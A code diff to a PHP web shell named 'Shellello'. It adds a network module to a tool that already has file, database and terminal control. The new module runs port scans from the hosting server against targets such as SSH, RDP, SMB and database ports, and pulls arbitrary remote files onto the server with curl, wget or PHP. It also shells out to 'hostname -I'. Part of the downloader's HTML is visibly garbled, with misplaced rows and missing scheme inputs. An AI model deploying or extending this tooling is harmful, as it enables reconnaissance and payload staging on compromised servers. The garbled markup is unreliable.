@@ -135,6 +135,44 @@ function getClientIp() {
     return 'Unknown';
 }
 
+function getServerIp() {
+    $candidates = [];
+
+    // Env/server provided values first
+    foreach (['SERVER_ADDR', 'LOCAL_ADDR', 'HOSTNAME'] as $key) {
+        $val = getenv($key) ?: ($_SERVER[$key] ?? null);
+        if ($val) $candidates[] = $val;
+    }
+
+    // Hostname resolution
+    $host = gethostname();
+    if ($host) {
+        $resolved = @gethostbyname($host);
+        if ($resolved) $candidates[] = $resolved;
+    }
+
+    // Shell fallback (may return multiple)
+    try {
+        $res = executeCommand('hostname -I');
+        if (isset($res['output'])) {
+            $shellIps = trim(implode(' ', $res['output']));
+            if ($shellIps) {
+                $parts = preg_split('/\s+/', $shellIps);
+                foreach ($parts as $p) { if ($p) $candidates[] = $p; }
+            }
+        }
+    } catch (Exception $e) {
+        // ignore if exec not available
+    }
+
+    foreach ($candidates as $ip) {
+        if (filter_var($ip, FILTER_VALIDATE_IP) && !preg_match('/^(127\.|::1)/', $ip)) {
+            return $ip;
+        }
+    }
+    return $candidates[0] ?? 'Unknown';
+}
+
 function getServerSoftware() {
     return getenv('SERVER_SOFTWARE') ?: ($_SERVER['SERVER_SOFTWARE'] ?? 'CLI');
 }
@@ -440,6 +478,103 @@ function handleApiAction($action) {
                 }
                 break;
 
+            // ========== NETWORK ACTIONS ==========
+            case 'scan_ports':
+                $target = trim($_POST['target'] ?? '');
+                $portsRaw = trim($_POST['ports'] ?? '');
+                if ($target === '') throw new Exception('Target required');
+
+                $defaultPorts = [21,22,23,25,53,80,110,135,139,143,443,445,465,587,993,995,1433,1521,2049,3306,3389,5432,5900,6379,8080,8443,9000,11211,27017];
+                $ports = $portsRaw ? preg_split('/[\s,;]+/', $portsRaw) : $defaultPorts;
+                $ports = array_values(array_unique(array_filter(array_map('intval', $ports), function($p) {
+                    return $p > 0 && $p <= 65535;
+                })));
+                $ports = array_slice($ports, 0, 100); // avoid very long scans
+                if (!$ports) throw new Exception('No valid ports to scan');
+
+                $results = [];
+                $openCount = 0;
+                foreach ($ports as $port) {
+                    $start = microtime(true);
+                    $errno = 0; $errstr = '';
+                    $conn = @fsockopen($target, $port, $errno, $errstr, 0.75);
+                    $latency = round((microtime(true) - $start) * 1000, 1);
+                    if ($conn) {
+                        fclose($conn);
+                        $results[] = ['port' => $port, 'status' => 'open', 'latency_ms' => $latency];
+                        $openCount++;
+                    } else {
+                        $results[] = ['port' => $port, 'status' => 'closed', 'latency_ms' => $latency];
+                    }
+                }
+
+                $response = ['status' => 'success', 'results' => $results, 'open' => $openCount, 'checked' => count($ports)];
+                break;
+
+            case 'remote_download':
+                $host = trim($_POST['host'] ?? '');
+                $port = (int)($_POST['port'] ?? 80);
+                $path = trim($_POST['path'] ?? '/');
+                $scheme = ($_POST['scheme'] ?? 'http') === 'https' ? 'https' : 'http';
+                $savePath = trim($_POST['save_path'] ?? '');
+
+                if ($host === '') throw new Exception('Host/IP required');
+                if ($port <= 0 || $port > 65535) throw new Exception('Invalid port');
+                $path = '/' . ltrim($path === '' ? '/' : $path, '/');
+
+                $url = $scheme . '://' . $host . ($port ? ':' . $port : '') . $path;
+
+                // Determine destination path
+                if ($savePath === '') {
+                    $basename = basename(parse_url($path, PHP_URL_PATH)) ?: 'download_' . time();
+                    $savePath = rtrim(getcwd(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $basename;
+                } elseif (is_dir($savePath)) {
+                    $basename = basename(parse_url($path, PHP_URL_PATH)) ?: 'download_' . time();
+                    $savePath = rtrim($savePath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $basename;
+                }
+
+                $destDir = dirname($savePath);
+                if (!is_dir($destDir) || !is_writable($destDir)) {
+                    throw new Exception('Destination not writable');
+                }
+
+                $methodUsed = null;
+                $commands = [
+                    ['label' => 'curl', 'cmd' => 'curl -m 15 -fsSL ' . escapeshellarg($url) . ' -o ' . escapeshellarg($savePath)],
+                    ['label' => 'wget', 'cmd' => 'wget -q -T 15 -O ' . escapeshellarg($savePath) . ' ' . escapeshellarg($url)],
+                ];
+
+                foreach ($commands as $c) {
+                    try {
+                        $result = executeCommand($c['cmd']);
+                        if ($result['exit_code'] === 0 && file_exists($savePath) && filesize($savePath) > 0) {
+                            $methodUsed = $c['label'];
+                            break;
+                        }
+                    } catch (Exception $e) {
+                        // Fallback to next method
+                    }
+                }
+
+                if (!$methodUsed) {
+                    $context = stream_context_create([
+                        'http' => ['timeout' => 15, 'follow_location' => 1],
+                        'https' => ['timeout' => 15, 'follow_location' => 1]
+                    ]);
+                    $data = @file_get_contents($url, false, $context);
+                    if ($data === false) {
+                        throw new Exception('All download methods failed or outbound blocked');
+                    }
+                    if (@file_put_contents($savePath, $data) === false) {
+                        throw new Exception('Failed to write downloaded content');
+                    }
+                    $methodUsed = 'php';
+                }
+
+                $size = file_exists($savePath) ? formatBytes(filesize($savePath)) : 'unknown';
+                $response = ['status' => 'success', 'message' => 'Downloaded', 'method' => $methodUsed, 'saved_to' => $savePath, 'size' => $size, 'url' => $url];
+                break;
+
             // ========== DATABASE ACTIONS ==========
             case 'db_connect':
                 $driver = $_POST['driver'] ?? 'mysql';
@@ -578,28 +713,28 @@ function renderLogin($error = null) {
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
             font-family: 'Segoe UI', system-ui, sans-serif;
-            background: linear-gradient(135deg, #1e3a5f 0%, #0d1b2a 100%);
+            background: radial-gradient(circle at 20% 20%, #1f2a44, #0b1220 55%, #050a14 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
         }
         .login-container {
-            background: rgba(255,255,255,0.95);
+            background: rgba(15,23,42,0.9);
             padding: 3rem;
             border-radius: 16px;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.45);
             width: 100%;
             max-width: 420px;
             text-align: center;
         }
         .logo { font-size: 3.5rem; margin-bottom: 0.5rem; }
-        h1 { color: #1e3a5f; font-size: 1.75rem; margin-bottom: 0.5rem; }
-        .subtitle { color: #64748b; font-size: 0.9rem; margin-bottom: 2rem; }
+        h1 { color: #e5e7eb; font-size: 1.75rem; margin-bottom: 0.5rem; }
+        .subtitle { color: #94a3b8; font-size: 0.9rem; margin-bottom: 2rem; }
         .error {
-            background: #fee2e2;
-            border: 1px solid #fecaca;
-            color: #dc2626;
+            background: rgba(239,68,68,0.1);
+            border: 1px solid rgba(239,68,68,0.35);
+            color: #fecdd3;
             padding: 0.75rem 1rem;
             border-radius: 8px;
             margin-bottom: 1.5rem;
@@ -616,20 +751,22 @@ function renderLogin($error = null) {
         input[type="password"] {
             width: 100%;
             padding: 0.875rem 1rem;
-            border: 2px solid #e5e7eb;
+            border: 2px solid #1f2937;
             border-radius: 10px;
             font-size: 1rem;
             transition: all 0.2s;
+            background: #0b1220;
+            color: #e5e7eb;
         }
         input[type="password"]:focus {
             outline: none;
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 3px rgba(59,130,246,0.1);
+            border-color: #60a5fa;
+            box-shadow: 0 0 0 3px rgba(96,165,250,0.35);
         }
         button {
             width: 100%;
             padding: 1rem;
-            background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
+            background: linear-gradient(135deg, #60a5fa 0%, #2563eb 100%);
             color: white;
             border: none;
             border-radius: 10px;
@@ -682,6 +819,7 @@ function renderLayout($title, $content, $activePage = 'dashboard') {
         'files' => ['icon' => '📁', 'label' => 'File Manager'],
         'database' => ['icon' => '🗄️', 'label' => 'Database'],
         'terminal' => ['icon' => '💻', 'label' => 'Terminal'],
+        'network' => ['icon' => '🌐', 'label' => 'Network'],
         'settings' => ['icon' => '⚙️', 'label' => 'Settings'],
     ];
 ?>
@@ -694,14 +832,16 @@ function renderLayout($title, $content, $activePage = 'dashboard') {
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         :root {
-            --primary: #3b82f6;
-            --primary-dark: #1d4ed8;
-            --nav-bg: #0f172a;
-            --bg: #f1f5f9;
-            --card-bg: #ffffff;
-            --text: #1f2937;
-            --text-muted: #6b7280;
-            --border: #e5e7eb;
+            --primary: #60a5fa;
+            --primary-dark: #1e40af;
+            --nav-bg: #0b1220;
+            --bg: #0b1220;
+            --card-bg: #0f172a;
+            --card-muted: #111827;
+            --text: #e5e7eb;
+            --text-muted: #9ca3af;
+            --border: #1f2937;
+            --hover: #111827;
         }
         body {
             font-family: 'Segoe UI', system-ui, sans-serif;
@@ -709,6 +849,7 @@ function renderLayout($title, $content, $activePage = 'dashboard') {
             color: var(--text);
             min-height: 100vh;
         }
+        a { color: inherit; }
         .top-nav {
             background: var(--nav-bg);
             color: white;
@@ -742,7 +883,7 @@ function renderLayout($title, $content, $activePage = 'dashboard') {
             align-items: center;
             gap: 0.5rem;
             padding: 1rem 1.25rem;
-            color: #94a3b8;
+            color: var(--text-muted);
             text-decoration: none;
             transition: all 0.2s;
             border-bottom: 3px solid transparent;
@@ -802,8 +943,9 @@ function renderLayout($title, $content, $activePage = 'dashboard') {
             background: var(--card-bg);
             border-radius: 12px;
             padding: 1.5rem;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            box-shadow: 0 8px 24px rgba(0,0,0,0.35);
             margin-bottom: 1.5rem;
+            border: 1px solid var(--border);
         }
         .btn {
             display: inline-flex;
@@ -820,8 +962,8 @@ function renderLayout($title, $content, $activePage = 'dashboard') {
         }
         .btn-primary { background: var(--primary); color: white; }
         .btn-primary:hover { background: var(--primary-dark); }
-        .btn-secondary { background: #e5e7eb; color: #374151; }
-        .btn-secondary:hover { background: #d1d5db; }
+        .btn-secondary { background: var(--card-muted); color: var(--text); border: 1px solid var(--border); }
+        .btn-secondary:hover { background: #1f2937; }
         .btn-danger { background: #ef4444; color: white; }
         .btn-danger:hover { background: #dc2626; }
         .btn-sm { padding: 0.375rem 0.75rem; font-size: 0.8rem; }
@@ -831,11 +973,13 @@ function renderLayout($title, $content, $activePage = 'dashboard') {
             border-radius: 8px;
             font-size: 0.95rem;
             transition: border-color 0.2s, box-shadow 0.2s;
+            background: var(--card-muted);
+            color: var(--text);
         }
         .form-control:focus {
             outline: none;
             border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(59,130,246,0.1);
+            box-shadow: 0 0 0 3px rgba(59,130,246,0.25);
         }
         table { width: 100%; border-collapse: collapse; }
         th, td {
@@ -844,18 +988,19 @@ function renderLayout($title, $content, $activePage = 'dashboard') {
             border-bottom: 1px solid var(--border);
         }
         th {
-            background: #f8fafc;
+            background: var(--card-muted);
             font-weight: 600;
             font-size: 0.85rem;
-            color: var(--text-muted);
+            color: var(--text);
             text-transform: uppercase;
             letter-spacing: 0.05em;
         }
-        tr:hover { background: #f8fafc; }
+        tr:hover { background: var(--hover); }
         .text-muted { color: var(--text-muted); }
         .text-success { color: #22c55e; }
         .text-danger { color: #ef4444; }
         .text-center { text-align: center; }
+        code { background: var(--card-muted); padding: 0.15rem 0.35rem; border-radius: 4px; }
     </style>
 </head>
 <body>
@@ -928,33 +1073,33 @@ function renderDashboard() {
     gap: 0.75rem;
     margin-bottom: 1.25rem;
     padding-bottom: 1rem;
-    border-bottom: 1px solid #e5e7eb;
+    border-bottom: 1px solid var(--border);
 }
-.card-header h3 { margin: 0; font-size: 1.1rem; color: #1f2937; }
+.card-header h3 { margin: 0; font-size: 1.1rem; color: var(--text); }
 .card-icon { font-size: 1.5rem; }
 .info-row {
     display: flex;
     justify-content: space-between;
     padding: 0.625rem 0;
-    border-bottom: 1px solid #f3f4f6;
+    border-bottom: 1px solid var(--border);
 }
 .info-row:last-child { border-bottom: none; }
-.info-label { color: #6b7280; font-size: 0.9rem; }
-.info-value { color: #1f2937; font-weight: 500; font-size: 0.9rem; }
+.info-label { color: var(--text-muted); font-size: 0.9rem; }
+.info-value { color: var(--text); font-weight: 500; font-size: 0.9rem; }
 .progress-container { margin-bottom: 1.5rem; }
 .progress-bar {
     height: 12px;
-    background: #e5e7eb;
+    background: var(--card-muted);
     border-radius: 6px;
     overflow: hidden;
     margin-bottom: 0.5rem;
 }
 .progress-fill { height: 100%; border-radius: 6px; transition: width 0.3s; }
-.progress-label { text-align: right; font-size: 0.85rem; color: #6b7280; }
+.progress-label { text-align: right; font-size: 0.85rem; color: var(--text-muted); }
 .disk-stats { display: flex; justify-content: space-between; text-align: center; }
 .disk-stat { flex: 1; }
-.stat-value { display: block; font-size: 1.25rem; font-weight: 600; color: #1f2937; }
-.stat-label { font-size: 0.8rem; color: #6b7280; }
+.stat-value { display: block; font-size: 1.25rem; font-weight: 600; color: var(--text); }
+.stat-label { font-size: 0.8rem; color: var(--text-muted); }
 .quick-actions { display: grid; grid-template-columns: repeat(2, 1fr); gap: 1rem; }
 .quick-btn {
     display: flex;
@@ -962,16 +1107,16 @@ function renderDashboard() {
     align-items: center;
     gap: 0.5rem;
     padding: 1.25rem;
-    background: #f8fafc;
+    background: var(--card-muted);
     border-radius: 12px;
     text-decoration: none;
-    color: #374151;
+    color: var(--text);
     transition: all 0.2s;
     border: 2px solid transparent;
 }
 .quick-btn:hover {
-    background: #eff6ff;
-    border-color: #3b82f6;
+    background: #111827;
+    border-color: var(--primary);
     transform: translateY(-2px);
 }
 .quick-btn span:first-child { font-size: 1.75rem; }
@@ -1133,7 +1278,7 @@ function renderFileManager() {
 .toolbar-actions { display: flex; gap: 0.5rem; }
 .file-table { margin: 0; }
 .file-table tbody tr { cursor: pointer; }
-.file-table tbody tr:hover { background: #eff6ff; }
+.file-table tbody tr:hover { background: var(--hover); }
 .file-icon { margin-right: 0.5rem; }
 .file-name { font-weight: 500; }
 .file-name.dir { color: #2563eb; }
@@ -1160,11 +1305,12 @@ function renderFileManager() {
 }
 .modal-overlay.show { display: flex; }
 .modal {
-    background: white;
+    background: var(--card-bg);
     border-radius: 12px;
     width: 90%;
     max-width: 500px;
-    box-shadow: 0 25px 50px rgba(0,0,0,0.25);
+    box-shadow: 0 25px 50px rgba(0,0,0,0.35);
+    border: 1px solid var(--border);
 }
 .modal.modal-lg { max-width: 900px; }
 .modal-header {
@@ -1172,16 +1318,10 @@ function renderFileManager() {
     justify-content: space-between;
     align-items: center;
     padding: 1rem 1.5rem;
-    border-bottom: 1px solid #e5e7eb;
+    border-bottom: 1px solid var(--border);
 }
 .modal-header h3 { margin: 0; font-size: 1.1rem; }
-.modal-close {
-    background: none;
-    border: none;
-    font-size: 1.5rem;
-    cursor: pointer;
-    color: #6b7280;
-}
+.modal-close { background: none; border: none; font-size: 1.5rem; cursor: pointer; color: var(--text-muted); }
 .modal-body { padding: 1.5rem; }
 .modal-body label { display: block; margin-bottom: 0.5rem; font-weight: 500; }
 .modal-body .form-control { width: 100%; margin-bottom: 1rem; }
@@ -1190,8 +1330,8 @@ function renderFileManager() {
     justify-content: flex-end;
     gap: 0.75rem;
     padding: 1rem 1.5rem;
-    border-top: 1px solid #e5e7eb;
-    background: #f9fafb;
+    border-top: 1px solid var(--border);
+    background: var(--card-muted);
     border-radius: 0 0 12px 12px;
 }
 .file-editor {
@@ -1200,20 +1340,20 @@ function renderFileManager() {
     font-family: 'Consolas', 'Monaco', monospace;
     font-size: 0.9rem;
     padding: 1rem;
-    border: 1px solid #e5e7eb;
+    border: 1px solid var(--border);
     border-radius: 8px;
     background: #1e293b;
     color: #e2e8f0;
     resize: vertical;
 }
 .upload-zone {
-    border: 2px dashed #d1d5db;
+    border: 2px dashed var(--border);
     border-radius: 12px;
     padding: 2rem;
     text-align: center;
     cursor: pointer;
 }
-.upload-zone:hover { border-color: #3b82f6; background: #eff6ff; }
+.upload-zone:hover { border-color: var(--primary); background: var(--hover); }
 </style>
 
 <div class="file-manager">
@@ -1403,7 +1543,8 @@ function renderFiles(files) {
             'editFile(\'' + esc(fullPath) + '\')');
         
         var acts = f.name === '..' ? '' : 
-            '<button class="action-btn" onclick="event.stopPropagation();showRename(\'' + esc(fullPath) + '\',\'' + esc(f.name) + '\')">✏️</button>' +
+            (isDir ? '' : '<button class="action-btn" onclick="event.stopPropagation();editFile(\'' + esc(fullPath) + '\')">✏️</button>') +
+            '<button class="action-btn" onclick="event.stopPropagation();showRename(\'' + esc(fullPath) + '\',\'' + esc(f.name) + '\')">📝</button>' +
             (isDir ? '' : '<button class="action-btn" onclick="event.stopPropagation();download(\'' + esc(fullPath) + '\')">⬇️</button>') +
             '<button class="action-btn danger" onclick="event.stopPropagation();showDelete(\'' + esc(fullPath) + '\',\'' + esc(f.name) + '\')">🗑️</button>';
         html += '<tr ondblclick="' + dbl + '">' +
@@ -1634,16 +1775,11 @@ function renderDatabase() {
     justify-content: space-between;
     align-items: center;
     padding: 1rem 1.5rem !important;
-    background: linear-gradient(135deg, #ecfdf5 0%, #d1fae5 100%);
-    border: 1px solid #a7f3d0;
+    background: linear-gradient(135deg, #0b3b2c 0%, #0f5135 100%);
+    border: 1px solid #115e3b;
 }
 .connection-status { display: flex; align-items: center; gap: 0.75rem; }
-.status-dot {
-    width: 10px; height: 10px;
-    background: #22c55e;
-    border-radius: 50%;
-    animation: pulse 2s infinite;
-}
+.status-dot { width: 10px; height: 10px; background: #22c55e; border-radius: 50%; animation: pulse 2s infinite; }
 @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
 .current-db {
     background: #22c55e; color: white;
@@ -1676,15 +1812,15 @@ function renderDatabase() {
     align-items: center;
     gap: 0.5rem;
 }
-.table-item:hover { background: #f3f4f6; }
-.table-item.active { background: #fef3c7; color: #d97706; }
+.table-item:hover { background: var(--hover); }
+.table-item.active { background: #1f2937; color: #fbbf24; }
 .sql-editor {
     width: 100%;
     height: 120px;
     font-family: 'Consolas', monospace;
     font-size: 0.95rem;
     padding: 1rem;
-    border: 1px solid #e5e7eb;
+    border: 1px solid var(--border);
     border-radius: 8px;
     background: #1e293b;
     color: #e2e8f0;
@@ -2058,15 +2194,15 @@ function renderTerminal() {
 }
 .quick-cmd {
     padding: 0.5rem 0.75rem;
-    background: #f3f4f6;
-    border: 1px solid #e5e7eb;
+    background: var(--card-muted);
+    border: 1px solid var(--border);
     border-radius: 6px;
     font-family: 'Consolas', monospace;
     font-size: 0.85rem;
     cursor: pointer;
     text-align: center;
 }
-.quick-cmd:hover { background: #e5e7eb; }
+.quick-cmd:hover { background: #1f2937; }
 .card-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid #e5e7eb; }
 .card-header h3 { margin: 0; font-size: 1.1rem; }
 .card-icon { font-size: 1.5rem; }
@@ -2253,9 +2389,218 @@ function esc(s) {
     renderLayout('Terminal', $content, 'terminal');
 }
 
-// ========== 11_SETTINGS ==========
+// ========== 11_NETWORK ==========
 /**
- * Shellello - Module 11: Settings Page
+ * Shellello - Module 11: Network Toolkit
+ */
+
+function renderNetwork() {
+    $defaultPorts = '21,22,23,25,53,80,110,135,139,143,443,445,465,587,993,995,1433,1521,2049,3306,3389,5432,5900,6379,8080,8443,9000,11211,27017';
+    ob_start();
+?>
+<style>
+.network-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 1.5rem; }
+.card-body { display: flex; flex-direction: column; gap: 0.75rem; }
+.form-group { display: flex; flex-direction: column; gap: 0.35rem; }
+.form-group label { font-weight: 500; color: var(--text); }
+.section-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border); }
+.section-header h3 { margin: 0; font-size: 1.1rem; }
+.hint { color: var(--text-muted); font-size: 0.9rem; }
+.result-box {
+    background: var(--card-muted);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1rem;
+    max-height: 280px;
+    overflow-y: auto;
+    font-family: 'Consolas', monospace;
+    font-size: 0.9rem;
+}
+.status-pill { display: inline-flex; align-items: center; gap: 0.35rem; padding: 0.25rem 0.65rem; border-radius: 999px; font-size: 0.85rem; }
+.pill-open { background: rgba(34,197,94,0.15); color: #34d399; border: 1px solid rgba(34,197,94,0.45); }
+.pill-closed { background: rgba(248,113,113,0.15); color: #fca5a5; border: 1px solid rgba(248,113,113,0.4); }
+.flex-row { display: flex; gap: 0.75rem; flex-wrap: wrap; align-items: center; }
+</style>
+
+<div class="network-grid">
+    <div class="card">
+        <div class="section-header">
+            <span style="font-size:1.4rem;">🛰️</span>
+            <h3>Port Scanner</h3>
+        </div>
+        <div class="card-body">
+            <div class="form-group">
+                <label>Target IP / Host</label>
+                <input type="text" id="scanTarget" class="form-control" placeholder="192.168.0.10 or example.com">
+            </div>
+            <div class="form-group">
+                <label>Ports</label>
+                <textarea id="scanPorts" class="form-control" rows="3" placeholder="Comma or space separated list. Leave empty to use common ports."></textarea>
+                <div class="hint">Default: <?php echo htmlspecialchars($defaultPorts); ?></div>
+            </div>
+            <div class="flex-row" style="margin-top:0.5rem;">
+                <button class="btn btn-primary" onclick="scanPorts()" id="scanBtn">🔍 Scan</button>
+                <button class="btn btn-secondary" onclick="fillDefaultPorts()">Use Default</button>
+                <span id="scanSummary" class="text-muted"></span>
+            </div>
+            <div id="scanResult" class="result-box" style="margin-top:1rem;">Awaiting scan...</div>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="section-header">
+            <span style="font-size:1.4rem;">⬇️</span>
+            <h3>Remote Downloader</h3>
+        </div>
+        <div class="card-body">
+            <div class="form-group">
+                <label>Protocol</label>
+                <div class="flex-row">
+                    <span class="info-label">Session Duration</span>
+                    <span class="info-value">&lt;?php echo getSessionTime(); ?&gt;</span>
+                </div>
+            </div>
+                    <span class="info-label">Client IP</span>
+                    <span class="info-value">&lt;?php echo getClientIp(); ?&gt;</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Server IP</span>
+                    <span class="info-value">&lt;?php echo getServerIp(); ?&gt;</span>
+                <input type="text" id="dlHost" class="form-control" placeholder="example.com">
+            </div>
+            <div class="form-group">
+                <label>Port</label>
+                <input type="number" id="dlPort" class="form-control" value="80" min="1" max="65535">
+            </div>
+            <div class="form-group">
+                <label>Path</label>
+                <input type="text" id="dlPath" class="form-control" placeholder="/file.txt">
+            </div>
+            <div class="form-group">
+                <label>Save to (optional)</label>
+                <input type="text" id="dlSave" class="form-control" placeholder="/tmp/file.txt (defaults to current dir)">
+            </div>
+            <div class="flex-row" style="margin-top:0.5rem;">
+                <button class="btn btn-primary" onclick="remoteDownload()" id="dlBtn">⬇️ Download</button>
+                <span id="dlStatus" class="text-muted"></span>
+            </div>
+            <div id="dlResult" class="result-box" style="margin-top:1rem;">No downloads yet.</div>
+        </div>
+    </div>
+</div>
+
+<script>
+var defaultPorts = <?php echo json_encode($defaultPorts); ?>;
+
+function fillDefaultPorts() {
+    document.getElementById('scanPorts').value = defaultPorts;
+}
+
+function scanPorts() {
+    var target = document.getElementById('scanTarget').value.trim();
+    if (!target) { toast('Enter a target first', 'error'); return; }
+    var btn = document.getElementById('scanBtn');
+    btn.disabled = true;
+    btn.textContent = 'Scanning...';
+    document.getElementById('scanSummary').textContent = '';
+    document.getElementById('scanResult').textContent = 'Scanning...';
+
+    var fd = new FormData();
+    fd.append('target', target);
+    fd.append('ports', document.getElementById('scanPorts').value);
+    fetch('?action=scan_ports', {method:'POST', body:fd})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            btn.disabled = false;
+            btn.textContent = '🔍 Scan';
+            if (data.status === 'success') {
+                renderScan(data.results || []);
+                document.getElementById('scanSummary').textContent = data.open + ' open / ' + data.checked + ' checked';
+            } else {
+                document.getElementById('scanResult').textContent = data.message || 'Scan failed';
+            }
+        })
+        .catch(function(err) {
+            btn.disabled = false;
+            btn.textContent = '🔍 Scan';
+            document.getElementById('scanResult').textContent = err.message;
+        });
+}
+
+function renderScan(list) {
+    if (!list.length) { document.getElementById('scanResult').textContent = 'No results'; return; }
+    var rows = list.map(function(item) {
+        var pill = item.status === 'open' ? '<span class="status-pill pill-open">OPEN</span>' : '<span class="status-pill pill-closed">closed</span>';
+        var latency = item.latency_ms ? item.latency_ms + ' ms' : '-';
+        return 'Port ' + item.port + ' ' + pill + ' <span class="text-muted">' + latency + '</span>';
+    });
+    document.getElementById('scanResult').innerHTML = rows.join('<br>');
+}
+
+function remoteDownload() {
+    var host = document.getElementById('dlHost').value.trim();
+    var port = document.getElementById('dlPort').value.trim();
+    var path = document.getElementById('dlPath').value.trim();
+    if (!host || !port || !path) { toast('Host, port, and path are required', 'error'); return; }
+    var btn = document.getElementById('dlBtn');
+    btn.disabled = true;
+    btn.textContent = 'Downloading...';
+    document.getElementById('dlStatus').textContent = '';
+    document.getElementById('dlResult').textContent = 'Attempting download...';
+
+    var fd = new FormData();
+    fd.append('host', host);
+    fd.append('port', port);
+    fd.append('path', path);
+    fd.append('save_path', document.getElementById('dlSave').value.trim());
+    var scheme = document.querySelector('input[name="scheme"]:checked');
+    fd.append('scheme', scheme ? scheme.value : 'http');
+
+    fetch('?action=remote_download', {method:'POST', body:fd})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            btn.disabled = false;
+            btn.textContent = '⬇️ Download';
+            if (data.status === 'success') {
+                var msg = 'Saved to: ' + data.saved_to + '\nMethod: ' + data.method + '\nSize: ' + data.size + '\nURL: ' + data.url;
+                document.getElementById('dlResult').textContent = msg;
+                document.getElementById('dlStatus').textContent = data.message;
+                toast('Downloaded via ' + data.method, 'success');
+            } else {
+                document.getElementById('dlResult').textContent = data.message || 'Download failed';
+                document.getElementById('dlStatus').textContent = 'Error';
+                toast(data.message || 'Download failed', 'error');
+            }
+        })
+        .catch(function(err) {
+            btn.disabled = false;
+            btn.textContent = '⬇️ Download';
+            document.getElementById('dlResult').textContent = err.message;
+        });
+}
+
+function toast(msg, type) {
+    var t = document.getElementById('toast');
+    if (!t) {
+        t = document.createElement('div');
+        t.id = 'toast';
+        t.style.cssText = 'position:fixed;bottom:2rem;right:2rem;padding:1rem 1.5rem;border-radius:8px;color:#fff;font-weight:500;z-index:9999;transition:opacity 0.3s;box-shadow:0 10px 25px rgba(0,0,0,0.2);';
+        document.body.appendChild(t);
+    }
+    t.textContent = msg;
+    t.style.background = type === 'error' ? '#ef4444' : '#22c55e';
+    t.style.opacity = '1';
+    setTimeout(function() { t.style.opacity = '0'; }, 3000);
+}
+</script>
+<?php
+    $content = ob_get_clean();
+    renderLayout('Network', $content, 'network');
+}
+
+// ========== 12_SETTINGS ==========
+/**
+ * Shellello - Module 12: Settings Page
  */
 
 function renderSettings() {
@@ -2284,13 +2629,13 @@ function renderSettings() {
     justify-content: space-between;
     align-items: flex-start;
     padding: 0.75rem;
-    background: #f8fafc;
+    background: var(--card-muted);
     border-radius: 8px;
     gap: 1rem;
 }
-.config-label { font-weight: 500; color: #374151; white-space: nowrap; }
+.config-label { font-weight: 500; color: var(--text); white-space: nowrap; }
 .config-value {
-    color: #6b7280;
+    color: var(--text-muted);
     text-align: right;
     word-break: break-all;
     font-family: 'Consolas', monospace;
@@ -2299,8 +2644,8 @@ function renderSettings() {
 .extensions-grid { display: flex; flex-wrap: wrap; gap: 0.5rem; }
 .extension-badge {
     padding: 0.25rem 0.75rem;
-    background: #e0e7ff;
-    color: #4338ca;
+    background: #1f2937;
+    color: #c4d4ff;
     border-radius: 20px;
     font-size: 0.8rem;
     font-weight: 500;
@@ -2312,7 +2657,7 @@ function renderSettings() {
 }
 .tool-card {
     padding: 1.25rem;
-    background: #f8fafc;
+    background: var(--card-muted);
     border-radius: 12px;
     cursor: pointer;
     transition: all 0.2s;
@@ -2320,8 +2665,8 @@ function renderSettings() {
     text-align: center;
 }
 .tool-card:hover {
-    background: #eff6ff;
-    border-color: #3b82f6;
+    background: #111827;
+    border-color: var(--primary);
     transform: translateY(-2px);
 }
 .tool-icon { font-size: 2rem; display: block; margin-bottom: 0.75rem; }
@@ -2338,21 +2683,22 @@ function renderSettings() {
 }
 .modal-overlay.show { display: flex; }
 .modal {
-    background: white;
+    background: var(--card-bg);
     border-radius: 12px;
     width: 90%;
     max-width: 500px;
-    box-shadow: 0 25px 50px rgba(0,0,0,0.25);
+    box-shadow: 0 25px 50px rgba(0,0,0,0.35);
+    border: 1px solid var(--border);
 }
 .modal-header {
     display: flex;
     justify-content: space-between;
     align-items: center;
     padding: 1rem 1.5rem;
-    border-bottom: 1px solid #e5e7eb;
+    border-bottom: 1px solid var(--border);
 }
 .modal-header h3 { margin: 0; font-size: 1.1rem; }
-.modal-close { background: none; border: none; font-size: 1.5rem; cursor: pointer; color: #6b7280; }
+.modal-close { background: none; border: none; font-size: 1.5rem; cursor: pointer; color: var(--text-muted); }
 .modal-body { padding: 1.5rem; }
 .modal-body label { display: block; margin-bottom: 0.5rem; font-weight: 500; }
 .modal-body .form-control { width: 100%; }
@@ -2361,11 +2707,11 @@ function renderSettings() {
     justify-content: flex-end;
     gap: 0.75rem;
     padding: 1rem 1.5rem;
-    border-top: 1px solid #e5e7eb;
-    background: #f9fafb;
+    border-top: 1px solid var(--border);
+    background: var(--card-muted);
     border-radius: 0 0 12px 12px;
 }
-.hash-result { margin-top: 1rem; padding-top: 1rem; border-top: 1px solid #e5e7eb; }
+.hash-result { margin-top: 1rem; padding-top: 1rem; border-top: 1px solid var(--border); }
 .hash-display {
     display: flex;
     align-items: center;
@@ -2552,9 +2898,9 @@ function toast(msg, type) {
     renderLayout('Settings', $content, 'settings');
 }
 
-// ========== 12_ROUTER ==========
+// ========== 13_ROUTER ==========
 /**
- * Shellello - Module 12: Main Router
+ * Shellello - Module 13: Main Router
  */
 
 function main() {
@@ -2601,6 +2947,9 @@ function main() {
             break;
         case 'terminal':
             renderTerminal();
+            break;
+        case 'network':
+            renderNetwork();
             break;
         case 'settings':
             renderSettings();
